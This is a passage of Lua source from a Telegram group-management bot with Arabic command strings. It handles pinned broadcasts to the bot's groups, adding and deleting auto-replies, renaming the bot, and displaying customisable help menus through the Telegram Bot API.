if DevaMeR:get(LanZo.."aMeR:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevaMeR:smembers(LanZo.."aMeR:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
aMeRText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
aMeRText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
aMeRText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
aMeRText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
aMeRText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
aMeRText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
aMeRText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
aMeRText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevaMeR:set(LanZo..'aMeR:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..aMeRText.." بالتثبيت \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     Source LanZo     --
if text and (text == 'حذف رد من متعدد' or text == 'مسح رد من متعدد') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevaMeR:set(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevaMeR:sismember(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,text) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
return false
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevaMeR:set(LanZo..'aMeR:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text and (text == 'حذف رد متعدد' or text == 'مسح رد متعدد') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevaMeR:set(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
DevaMeR:set(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevaMeR:sismember(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,text) then
local aMeR = "᥀︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(aMeR).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر ارسل الرد الاول\n᥀︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevaMeR:set(LanZo..'aMeR:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevaMeR:sadd(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source LanZo     --
if text and (text == 'حذف رد' or text == 'مسح رد') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevaMeR:set(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد' or text == 'اضافه رد' or text == 'اضافة رد') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
DevaMeR:set(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevaMeR:get(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevaMeR:set(LanZo..'aMeR:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevaMeR:sadd(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_,text)
DevaMeR:set(LanZo..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source LanZo     --
if text and (text == 'حذف رد عام' or text == '↫ حذف رد عام ᥀' or text == 'مسح رد عام' or text == 'حذف رد للكل' or text == 'مسح رد للكل' or text == 'مسح رد مطور' or text == 'حذف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
local List = DevaMeR:smembers(LanZo.."aMeR:Sudo:AllRed")
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevaMeR:set(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد عام' or text == '↫ اضف رد عام ᥀' or text == 'اضف رد للكل' or text == 'اضف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:Rd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
DevaMeR:set(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevaMeR:get(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevaMeR:set(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevaMeR:set(LanZo.."aMeR:Add:AllText"..msg.sender_user_id_, text)
DevaMeR:sadd(LanZo.."aMeR:Sudo:AllRed",text)
DevaMeR:set(LanZo.."DelSudoRep",text)
return false 
end end
--     Source LanZo     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local redod = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevaMeR:smembers(LanZo..'aMeR:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == 'حذف الردود المتعدده' or text == 'مسح الردود المتعدده') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:GpRd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المتعدده وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevaMeR:del(LanZo..'aMeR:Text:GpTexts'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الردود المتعدده")  
return false
end
end
end
end
--     Source LanZo     --
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevaMeR:get(LanZo.."aMeR:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevaMeR:get(LanZo.."aMeR:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevaMeR:get(LanZo.."aMeR:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevaMeR:get(LanZo.."aMeR:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevaMeR:get(LanZo.."aMeR:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevaMeR:get(LanZo.."aMeR:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevaMeR:get(LanZo.."aMeR:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevaMeR:get(LanZo.."aMeR:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text =='حذف الردود' or text == 'مسح الردود' or text == 'حذف ردود المدير' or text == 'مسح ردود المدير') and ChCheck(msg) then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:GpRd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevaMeR:smembers(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevaMeR:del(LanZo..'aMeR:Gif:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Voice:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Audio:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Photo:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Stecker:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Video:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:File:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Text:GpRed'..v..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف ردود المدير")  
return false
end
end
end
--     Source LanZo     --
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ᥀" and SecondSudo(msg) then
local redod = DevaMeR:smembers(LanZo.."aMeR:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevaMeR:get(LanZo.."aMeR:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevaMeR:get(LanZo.."aMeR:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevaMeR:get(LanZo.."aMeR:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevaMeR:get(LanZo.."aMeR:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevaMeR:get(LanZo.."aMeR:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevaMeR:get(LanZo.."aMeR:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevaMeR:get(LanZo.."aMeR:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevaMeR:get(LanZo.."aMeR:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == "حذف ردود المطور" or text == "حذف ردود العام" or text == "مسح ردود المطور" or text == "↫ مسح ردود العام ᥀") then
if not Bot(msg) and DevaMeR:get(LanZo..'aMeR:Lock:GpRd'..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي او اعلى فقط ', 1, 'md')
else
local redod = DevaMeR:smembers(LanZo.."aMeR:Sudo:AllRed")
if #redod == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevaMeR:del(LanZo.."aMeR:Add:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Gif:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Voice:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Audio:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Photo:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Stecker:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Video:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:File:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Text:AllRed"..v)
DevaMeR:del(LanZo.."aMeR:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف ردود المطور")  
return false
end
end 
end
--     Source LanZo     --
if text and text == "تغيير اسم البوت" and ChCheck(msg) or text and text == "وضع اسم البوت" and ChCheck(msg) or text and text == "تغير اسم البوت" and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي اسم البوت الان" ,  1, "md") 
DevaMeR:set(LanZo..'aMeR:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' and ChCheck(msg) or text == 'مسح اسم البوت' and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:NameBot')
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم حذف اسم البوت'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end end 
--     Source LanZo     --
if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) and ChCheck(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) and ChCheck(msg) then
HelpList ={'aMeR:Help','aMeR:Help1','aMeR:Help2','aMeR:Help3','aMeR:Help4','aMeR:Help5','aMeR:Help6'}
for i,Help in pairs(HelpList) do
DevaMeR:del(LanZo..Help) 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text == "تعيين الاوامر" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help0'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help0'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "الاوامر" and ChCheck(msg) or text == "اوامر" and ChCheck(msg) or text == "مساعده" and ChCheck(msg) then
local Help = DevaMeR:get(LanZo..'aMeR:Help')
local Text = [[
᥀︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙م1 ↫ اوامر الحمايه
᥀︙م2 ↫ اوامر الادمنيه
᥀︙م3 ↫ اوامر المدراء
᥀︙م4 ↫ اوامر المنشئين
᥀︙م5 ↫ اوامر المطورين
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعيين امر م1" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م١" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م1) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help01'..msg.sender_user_id_)
if LanZoTeam == 'msg' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help01'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help1', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوامر١" then
if not Admin(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevaMeR:get(LanZo..'aMeR:Help1')
local Text = [[
᥀︙اوامر حماية المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح ↫ الروابط
᥀︙قفل • فتح ↫ المعرفات
᥀︙قفل • فتح ↫ البوتات
᥀︙قفل • فتح ↫ المتحركه
᥀︙قفل • فتح ↫ الملصقات
᥀︙قفل • فتح ↫ الملفات
᥀︙قفل • فتح ↫ الصور
᥀︙قفل • فتح ↫ الفيديو
᥀︙قفل • فتح ↫ الاونلاين
᥀︙قفل • فتح ↫ الدردشه
᥀︙قفل • فتح ↫ التوجيه
᥀︙قفل • فتح ↫ الاغاني
᥀︙قفل • فتح ↫ الصوت
᥀︙قفل • فتح ↫ الجهات
᥀︙قفل • فتح ↫ الماركداون
᥀︙قفل • فتح ↫ التكرار
᥀︙قفل • فتح ↫ الهاشتاك
᥀︙قفل • فتح ↫ التعديل
᥀︙قفل • فتح ↫ التثبيت
᥀︙قفل • فتح ↫ الاشعارات
᥀︙قفل • فتح ↫ الكلايش
᥀︙قفل • فتح ↫ الدخول
᥀︙قفل • فتح ↫ الشبكات
᥀︙قفل • فتح ↫ المواقع
᥀︙قفل • فتح ↫ الفشار
᥀︙قفل • فتح ↫ الكفر
᥀︙قفل • فتح ↫ الطائفيه
᥀︙قفل • فتح ↫ الكل
